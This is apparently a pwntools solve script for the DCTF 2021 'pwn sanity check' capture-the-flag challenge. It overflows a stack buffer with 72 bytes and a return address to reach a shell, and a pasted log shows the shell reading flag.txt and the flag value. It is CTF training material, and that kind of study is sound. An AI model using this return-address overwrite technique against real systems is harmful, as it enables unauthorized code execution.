from pwn import *

#context.log_level = 'debug'

BINARY = './pwn_sanity_check'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io"
  PORT = 7480
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("tell me a joke")

buf  = "A"*72
buf += p64(0x4006db)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/DCTF_2021/Pwn_Pwn_sanity_check_100$ python solve.py r
[*] '/home/mito/CTF/DCTF_2021/Pwn_Pwn_sanity_check_100/pwn_sanity_check'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io on port 7480: Done
[*] Switching to interactive mode

will this work?
$ id
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
$ ls -l
total 20
-rw-r--r-- 1 root  root    19 May 14 01:20 flag.txt
-rwxr-xr-x 1 pilot pilot 8632 May 14 01:20 pwn_sanity_check
-rw-r--r-- 1 root  root   226 May 14 01:20 startService.sh
$ cat flag.txt
dctf{Ju5t_m0v3_0n}
'''

